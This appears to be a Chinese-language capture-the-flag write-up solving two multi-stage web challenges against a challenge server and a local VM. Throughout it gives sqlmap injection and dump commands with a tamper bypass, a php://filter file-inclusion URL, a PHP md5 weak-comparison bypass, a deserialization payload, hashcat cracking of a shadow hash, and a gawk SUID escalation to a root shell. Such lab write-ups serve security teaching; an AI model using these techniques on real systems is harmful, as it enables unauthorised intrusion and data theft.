## Web

[TOC]

### Web1

#### 第一关

“请使用百度爬虫访问此页面”，通过headers中加入**百度蜘蛛（爬虫）的User Agent**实现模拟百度爬虫访问页面。

```python
import requests
headers = {
    'User-Agent': "Mozilla/5.0 (compatible;Baiduspider/2.0; + http://www.baidu.com/search/spider.html;"
}
s = requests.get("http://103.35.75.161/", headers=headers)
print(s.text)

```

![Screen Shot 2019-01-20 at 2.45.04 PM](https://ws1.sinaimg.cn/large/006tNc79gy1fzd1rao8kqj30ko03cmxf.jpg)

得到Flag：**flag{L3H_Le7_Us_st9rt}**

同时得到第二关入口：

http://103.35.75.161/sql1n.php

------

#### 第二关

![Screen Shot 2019-01-20 at 2.50.40 PM](https://ws1.sinaimg.cn/large/006tNc79gy1fzd1x0iyjbj31eg0e4jsg.jpg)

由url可知需要用到sql相关知识，页面内容和hint更是证实了这一猜想。

有登录框，考虑post注入。在账号密码处分别输入“ ’ ”，发现均报错，说明存在漏洞。

![](https://ws3.sinaimg.cn/large/006tNc79ly1fzgba2njd1j31sy0esq4t.jpg)

![](https://ws2.sinaimg.cn/large/006tNc79ly1fzgbawl0q7j31pi0ditak.jpg)

接下来，Burp Suite抓一下包。

![](https://ws3.sinaimg.cn/large/006tNc79gy1fzgbc4k0q8j31gg0fa0wd.jpg)

将抓到的包保存到`data.txt`中备用。

构造`select * from admin where username=’’ or '1'='1‘--‘ and password=’password‘`这样的SQL语句，即用户名处输入’ or '1'='1‘--，发现行不通，提示`No dangerous character`。看来页面做了危险字符过滤。

把所有空格替换成`%a0`，不再提示No dangerous character，重新提示执行失败，说明做了空格过滤。

上sqlmap：

先注入

`python sqlmap.py -r data.txt --tamper=space2comment.py`

发现以下注入点：

![Screen Shot 2019-01-27 at 6.23.23 AM](https://ws2.sinaimg.cn/large/006tNc79ly1fzkqlfj7ncj30vs0hogvt.jpg)

查看数据库

`python sqlmap.py -r data.txt --tamper=space2comment.py --dbs`

![Screen Shot 2019-01-27 at 6.25.29 AM](https://ws3.sinaimg.cn/large/006tNc79ly1fzkqngtdz6j309w04w3zh.jpg)

查看当前数据库

`python sqlmap.py -r data.txt --tamper=space2comment.py --current-db`

![Screen Shot 2019-01-27 at 6.27.22 AM](https://ws2.sinaimg.cn/large/006tNc79ly1fzkqpeep1rj30b800yaa5.jpg)

查看当前数据库下的tables

`python sqlmap.py -r data.txt --tamper=space2comment.py -D admin --table`

![Screen Shot 2019-01-27 at 6.32.15 AM](https://ws3.sinaimg.cn/large/006tNc79ly1fzkqujejmfj306e0403yu.jpg)

查看user的列

`python sqlmap.py -r data.txt --tamper=space2comment.py -D admin -T user --columns`

![Screen Shot 2019-01-27 at 6.32.52 AM](https://ws1.sinaimg.cn/large/006tNc79ly1fzkqws1uagj308a076dgx.jpg)

查看password对应键值

`python sqlmap.py -r data.txt --tamper=space2comment.py -D admin -T user -C password --dump`

![Screen Shot 2019-01-27 at 6.31.42 AM](https://ws4.sinaimg.cn/large/006tNc79ly1fzkqtye086j30b207gwfq.jpg)

拿到flag：**flag{L3H_fUnnY_S9L_1n}**

------

#### 第三关

根据上一步的提示，访问/include.php（或者直接用御剑也能扫到），点击页面内"点一下，玩一年"，在弹出的joke.php页面检查一下元素，发现hint：

`<!-- hint:Try to read this file using Base64 encoding-->`

这里“this file”很迷，是指joke.php还是include.php呢？这里的encoding也很有意思，英文里“encode/encoding”一词既可以指“编码”，也可以指“（利用某种编码）译成密码（的过程）”。我刚开始还以为要在本地对php文件做base64加密，后来经过研究才发现，这步是利用php伪协议，直接用base64编码访问include.php，与joke.php无关。

附：网上对php://filter的解释如下：

> 通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。

直接访问：

```
http://103.35.75.161/include.php?file=php://filter/read=convert.base64-encode/resource=include.php
```

得到：

```
77u/PD9waHANCmhlYWRlcigiQ29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7DQplcnJvcl9yZXBvcnRpbmcoMCk7DQppZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5jbHVkZS5waHA/ZmlsZT1qb2tlLnBocCI+54K55LiA5LiLLOeOqeS4gOW5tDwvYT4nO30NCiRmaWxlPSRfR0VUWydmaWxlJ107DQppZihzdHJzdHIoJGZpbGUsInBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1pbmNsdWRlLnBocCIpIG9yIHN0cnN0cigkZmlsZSwicGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWRtc2ouYmFrLnBocCIpKQ0Ke2luY2x1ZGUoJGZpbGUpO30NCmVsc2UgaWYoaXNzZXQoJGZpbGUpKXsNCiAgICBlY2hvICJvb29wcywgeW91IGFyZSByZWFsbHkgYSBiYWQgaGFja2VyIjsNCiAgICBlY2hvICI8IS0tIGhpbnQ6VHJ5IHRvIHJlYWQgdGhpcyBmaWxlIHVzaW5nIEJhc2U2NCBlbmNvZGluZy0tPiI7DQogICAgZXhpdCgpOw0KfQ0KDQovL2ZsYWd7TDNIX0ZpTDNfSW5jTHVzMTBuX0lTX04wN19zQGYzfQ0KLy9uZXh0X2xldmVsIDogZG1zai5w
```

base64解密得

```php+HTML
<?php
header("Content-type:text/html;charset=utf-8");
error_reporting(0);
if(!$_GET[file]){echo '<a href="./include.php?file=joke.php">点一下,玩一年</a>';}
$file=$_GET['file'];
if(strstr($file,"php://filter/read=convert.base64-encode/resource=include.php") or strstr($file,"php://filter/read=convert.base64-encode/resource=dmsj.bak.php"))
{include($file);}
else if(isset($file)){
    echo "ooops, you are really a bad hacker";
    echo "<!-- hint:Try to read this file using Base64 encoding-->";
    exit();
}

//flag{L3H_FiL3_IncLus10n_IS_N07_s@f3}
//next_level : dmsj.p
```

拿到flag：**flag{L3H_FiL3_IncLus10n_IS_N07_s@f3}**

------

#### 第四关

上一步解密得到的base64字符串（include.php完整内容）中发现这样一行：

```php
strstr($file,"php://filter/read=convert.base64-encode/resource=dmsj.bak.php")
```

直接访问`http://103.35.75.161/include.php?file=php://filter/read=convert.base64-encode/resource=dmsj.bak.php`，同样base64解密，得到

```php+HTML
<?php
header("Content-type:text/html;charset=utf-8");
$md51 = md5('QNKCDZO');
$a =@$_GET['a'];
$md52 = md5($a);
if (isset($a)){
    if ($a!='QNKCDZO' && $md51==$md52){
        echo "<font size='10cm' color='green'>flag{***********}</font><br><br>";
                echo "<font size='10cm' color='green'><a href='**********'>终极挑战</a></font>";
    }else{
        echo "<font size='10cm' color='red'>错误!</font>";
    }
}else{
    echo "<font size='10cm' color='orange'>请传入a的值</font>";
}
```

循着next_level的提示访问dmsj.php，弹出

![Screen Shot 2019-01-27 at 12.08.32 PM](https://ws2.sinaimg.cn/large/006tNc79ly1fzl0ktkivej30fq046mxe.jpg)

发现和dmsj.bak.php的内容相吻合。故dmsj.bak.php的完整源码可以辅助我们解dmsj.php。

查看dmsj.php源码，发现hint：

`<!-- 
hint: You may need to use something from the previous level
hint: dmsj.bak.php
-->`

与刚刚的推断相吻合。

关注源码中这一部分

```php
...
$md51 = md5('QNKCDZO');
$a =@$_GET['a'];
$md52 = md5($a);
if (isset($a)){
    if ($a!='QNKCDZO' && $md51==$md52){
...
```

可见a要输入一个md5和QNKCDZO相等但不是QNKCDZO的字符串。严格来讲这样的字符串是几乎不可能找到的，但联想到PHP语言的弱类型，又发现QNKCDZO的md5为`0e830400451993494058024219903391`，一切就明了了。

> PHP在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。

而0exxxxxxx如果做科学计数法来理解其值恒为0，如此一来我们只需找到一个md5加密后密文开头为0e的字符串就好了。`240610708`就是一个。

直接访问`http://103.35.75.161/dmsj.php?a=240610708`，拿到flag：**flag{L3H_d0ub13_eQu@l_Is_s0_fUn}**

------

#### 第五关

来到最后一步啦

![Screen Shot 2019-01-27 at 12.32.37 PM](https://ws2.sinaimg.cn/large/006tNc79ly1fzl19i3n2bj31e60cm76a.jpg)

看样子又像base64编码，解密5次，得

```
<?cuc
	reebe_ercbegvat(0);
	rpub "Pbatenghyngvbaf ba lbhe neeviny ng gur ynfg yriry <oe><oe>";
	rpub "Lbh ner bayl bar fgrc fubeg bs lbhe svany fhpprff <oe><oe>";
	rpub "Ohg vg frrzf n yvggyr qvssvphyg :)<oe><oe>";
  pynff Luxgdy{ 
    cebgrpgrq $svyr='onx.cuc';
    shapgvba __qrfgehpg(){ 
      vs(!rzcgl($guvf->svyr)) {
       vs(fgepue($guvf-> svyr,"\\")===snyfr &&  fgepue($guvf->svyr, '/')===snyfr)
          fubj_fbhepr(qveanzr (__SVYR__).'/'.$guvf ->svyr);
       ryfr      qvr('Jebat svyranzr.');
      }}  
    shapgvba __jnxrhc(){ $guvf-> svyr='onx.cuc'; } 
    choyvp shapgvba __gbFgevat(){erghea '' ;}}     
    vs (!vffrg($_TRG['uhfg'])){ fubj_fbhepr('onx.cuc'); } 
    ryfr{ 
       $svyr=onfr64_qrpbqr( $_TRG['uhfg']); 
       rpub hafrevnyvmr($svyr ); } 
 ?>
```

php文件开头应该是`<?php`，这里是`<?cuc`，看样子很像凯撒密码啊。偏移量13，解密得

```php+HTML
<?php 
    error_reporting(0); 
    echo "Welcome to the final test! <br><br>"; 
    echo "There is only one step short to your final success <br><br>"; 
    echo "But it seems a little difficult :)<br><br>"; 
  class Yhktql{  
    protected $file='bak.php'; 
    function __destruct(){  
      if(!empty($this->file)) { 
       if(strchr($this-> file,"\\")===false &&  strchr($this->file, '/')===false) 
          show_source(dirname (__FILE__).'/'.$this ->file); 
       else      die('Wrong filename.'); 
      }}   
    function __wakeup(){ $this-> file='bak.php'; }  
    public function __toString(){return '' ;}}      
    if (!isset($_GET['hust'])){ show_source('bak.php'); }  
    else{  
       $file=base64_decode( $_GET['hust']);  
       if(strstr($file,"F1n4L_t3sT.php")) 
       echo unserialize($file ); }  
 ?>
```

（一定要注意大小写！！！）

果不其然，`http://103.35.75.161/F1n4L_t3sT.php`源码中

![Screen Shot 2019-01-27 at 12.41.02 PM](https://ws4.sinaimg.cn/large/006tNc79ly1fzl1i87k6ej30vo02swev.jpg)

再次验证了前面得到的结论。

分析php源码，可以利用PHP反序列化漏洞。参考`https://blog.csdn.net/fly_hps/article/details/82736992`，构造payload

`O:6:"Yhktql":2:{S:7:"\00*\00file";s:14:"F1n4L_t3sT.php";}`

将其转换为Base64再加上前面的php目录和get变量名，得完整url：

`http://103.35.75.161/F1n4L_t3sT.php?hust=Tzo2OiJZaGt0cWwiOjI6e1M6NzoiXDAwKlwwMGZpbGUiO3M6MTQ6IkYxbjRMX3Qzc1QucGhwIjt9`。

![Screen Shot 2019-01-27 at 7.36.09 PM](https://ws2.sinaimg.cn/large/006tNc79ly1fzldi91e0vj312a0si7bb.jpg)

访问即得flag：**flag:{W3Lc0m3_tO_L3H!_Ple@SE_cONt@Ct_Mr6} **

------

### Web2

#### 第一关

cmd下ipconfig命令找到**VMware Network Adapter VMnet8**的ipv4地址为192.168.52.1。使用Nmap扫描**VMware Network Adapter VMnet8**网卡的NAT网段C段IP，即可找到虚拟机IP，命令：

`nmap -sP 192.168.52.1/24`。

共找到三个ip：192.168.52.254 192.168.52.128 192.168.52.1。接着`nmap -A <ip>`找开放端口，192.168.52.128找到一个http端口80。

Firefox（Edge Chrome都不行）下登入192.168.52.128，发现http basic认证的问候语`ZDJWaWFIVnpkR1Z5T21oMWMzUXhNak14TWpNeE1qTT0=`，等于号结尾初步判断base64加密，解密2次得`webhuster:hust123123123`，以此作为用户名密码登录。

![捕获5](https://ws3.sinaimg.cn/large/006tNc79ly1fzk63gre2gj312g07x3zu.jpg)

得到flag：**flag1{H4ppy_P1ay_W17h_B64}**以及Next flag的提示。

------

#### 第二关

F12审查元素看到strange things的提示，http://ctf.ssleye.com/cvencode.html做核心价值观解码，得到`/Secret_file_is_here.zip`。把zip下载下来，拿到第二个flag：**flag2{B1B1B1B1_1s_1nte2es7inG}**。

------

#### 第三关

flag3此时也唾手可得，爆破一下zip6位密码，`584925`。flag：**flag3{N0t_A_web_eXpl0it}**

------

#### 第四关

按照提示接着对txt文件做35次base64解密。附python代码：

```python
import base64
with open('A_Very_Big_File_1s_herE.txt', "r") as f:
    string = f.read()
# print(string)
for i in range(35):
    string = base64.b64decode(string)
print(string)
```

得到解密后字符串：`b'flag4{Py7h0n_1s_A_usefu1_T00l}\n\nnext flag is here: /Redirect_Redirect_Redirect.html\n\nYou may need a tool named: Burp Suite\n'`

第4个flag：**flag4{Py7h0n_1s_A_usefu1_T00l}**

------

#### 第五关

`http://192.168.52.128/Redirect_Redirect_Redirect.html`一秒就跳转到`http://192.168.52.128/no_key_is_here_forever.html`，来不及看页面内容。遂Burp Suite抓包，Proxy->Options->Match and Replace->Add->输入"^Location.*$"，以防网页重定向。或者在Target->Site Map中也可在对应网页Response->Raw中看到页面内容。flag5：**flag5{BURP_burp_b1bbuu2ur3rrpp4p}**![捕获6](https://ws2.sinaimg.cn/large/006tNc79ly1fzk63pvzk2j30ke07ewes.jpg)

------

#### 第六关

sqlmap命令：

先注入

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123"`

![捕获8](https://ws4.sinaimg.cn/large/006tNc79ly1fzk640i8skj30zo0ikmya.jpg)

查看数据库

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123" --dbs`

![捕获7](https://ws1.sinaimg.cn/large/006tNc79ly1fzk649mg2jj30ib06k3yj.jpg)

查看当前数据库

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123" --current-db`

![捕获9](https://ws2.sinaimg.cn/large/006tNc79ly1fzk64jfunjj30jr02cq2t.jpg)

查看当前数据库下的tables

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123" -D hustctf --table`

![捕获10](https://ws2.sinaimg.cn/large/006tNc79ly1fzk64optwxj30pi07ojre.jpg)

查看flag_is_here的列

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123" -D hustctf -T flag_is_here --columns`

![捕获11](https://ws3.sinaimg.cn/large/006tNc79ly1fzk65rfpoqj30zp0cd74j.jpg)

查看username对应键值

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123" -D hustctf -T flag_is_here -C username --dump`

![捕获12](https://ws1.sinaimg.cn/large/006tNc79ly1fzk65nela8j313c0bot8w.jpg)

拿到flag6： **flag6{D0_Youu_Kn0w_PDO_PDO_PDO}**

------

#### 第七关

查看password_hash对应键值

`python sqlmap.py -u "http://192.168.52.128/SQLLLLLLLLLLLLLLLLLL.php?id=1" --auth-type Basic --auth-cred "webhuster:hust123123123" -D hustctf -T flag_is_here -C password_hash --dump`

![捕获13](https://ws1.sinaimg.cn/large/006tNc79ly1fzk65w6mvwj31ky0bkq3h.jpg)

按照提示，用hashcat挂载rockyou_dict.txt字典文件解密/etc/shadow密码， 密文字符串格式为：\$id\$salt\$encrypted

`$6$7SRCnV5i$IbD6jUjR5WpStPtruqrLzaD08Ao7PpmIA8LywHWvz8pgmpVzZmVpksG7ZYcF5imDHYB9s35XFOa2PiU.xUBdg0`

| ID   |                            Method                            |
| ---- | :----------------------------------------------------------: |
| 1    |                             MD5                              |
| 2a   | Blowfish(not in mainline glibc;added in some Linux distribution) |
| 5    |                   SHA-256(since glibc 2.7)                   |
| 6    |                   SHA-512(since glibc 2.7)                   |

id为6，说明SHA-512加密。查询帮助文档可知，代号1800对应`sha512crypt $6$, SHA512 (Unix)`

用命令`hashcat64.exe -a 0 -m 1800 -o output.txt input.txt rockyou_dict.txt -O`

爆破密码，得`santiago7941`。

注：因为我使用的是Macbook，只有一个垃圾集显，爆破密码跑不快，故我用谷歌免费GPU平台Google Colab跑了一下。需要先在Colab上部署hashcat：`!hashcat -a 0 -m 1800 -o output.txt input.txt rockyou_dict.txt -O`（!开头以执行linux指令）

回到VMware Workstation，输入登录名：huster，密码：santiago7941，拿到第七个flag：**flag7{hAsh_0at\_!_p0werfu1}**

![捕获14](https://ws4.sinaimg.cn/large/006tNc79ly1fzk657cw6cj30up09g3zp.jpg)

------

#### 第八关

从hint8.txt入手，编码由+-[]<>.构成，乃BrainFuck编码，`https://www.nayuki.io/page/brainfuck-interpreter-javascript`解码得

`You can Google: suid privilege escalation and this site maybe helpful https://gtfobins.github.io/`

注：Linux虚拟机下不太方便把txt导出来，我直接OCR识别的

下面的命令可以发现所有的系统中有SUID权限的可执行文件

```
find / -perm -u=s -type f 2>/dev/null
```

![捕获16](https://ws3.sinaimg.cn/large/006tNc79ly1fzk650jxcyj30ra0dsgn9.jpg)

将`https://gtfobins.github.io/`中有SUID或Limited SUID标签的Unix Binaries和上图中的文件相匹配，找到一个gawk（gnu awk）。先用`which gawk`找到gawk所在目录`/usr/bin/gawk`，再根据`https://gtfobins.github.io/gtfobins/awk/#limited-suid`网页上的说明，虚拟机中执行`/usr/bin/gawk 'BEGIN {system("/bin/sh")}'`，拿到root权限的shell。

![Screen Shot 2019-01-26 at 5.55.23 PM](https://ws4.sinaimg.cn/large/006tNc79ly1fzk4z3wyvtj30ra02y74c.jpg)

最后用`cat /root/you_win.txt`打印出最后一个flag：**flag8{We1comE_T0_L3H_TeAm}**

